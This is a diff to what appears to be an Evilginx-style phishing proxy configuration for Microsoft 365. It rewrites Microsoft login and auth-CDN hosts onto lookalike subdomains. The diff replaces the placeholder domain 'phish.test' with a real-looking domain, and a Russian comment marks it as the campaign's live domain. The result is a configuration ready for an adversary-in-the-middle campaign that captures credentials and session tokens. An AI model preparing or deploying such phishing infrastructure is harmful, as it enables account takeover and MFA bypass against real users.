@@ -4,7 +4,7 @@
 id: microsoft365
 version: 2
 base_domains:
-  - "phish.test" # REPLACE-ME: боевой домен кампании
+  - "verdebudget.ru" # REPLACE-ME: боевой домен кампании
 proxy_hosts:
   - phish_sub: "m365"
     orig_sub: "login"
@@ -25,22 +25,22 @@ proxy_hosts:
 sub_filters:
   - triggers_on: "login.microsoftonline.com"
     search: "login.microsoftonline.com"
-    replace: "m365.phish.test"
+    replace: "m365.verdebudget.ru"
     mime: ["text/html", "application/json"]
     redirect_only: false
   - triggers_on: "login.live.com"
     search: "login.live.com"
-    replace: "live.phish.test"
+    replace: "live.verdebudget.ru"
     mime: ["text/html", "application/json"]
     redirect_only: false
   - triggers_on: "aadcdn.msauth.net"
     search: "aadcdn.msauth.net"
-    replace: "msauth.phish.test"
+    replace: "msauth.verdebudget.ru"
     mime: ["text/html", "text/css", "application/json", "javascript"]
     redirect_only: false
   - triggers_on: "aadcdn.msftauthimages.net"
     search: "aadcdn.msftauthimages.net"
-    replace: "msauthimg.phish.test"
+    replace: "msauthimg.verdebudget.ru"
     mime: ["text/html", "text/css", "application/json", "javascript"]
     redirect_only: false
 auth_tokens:
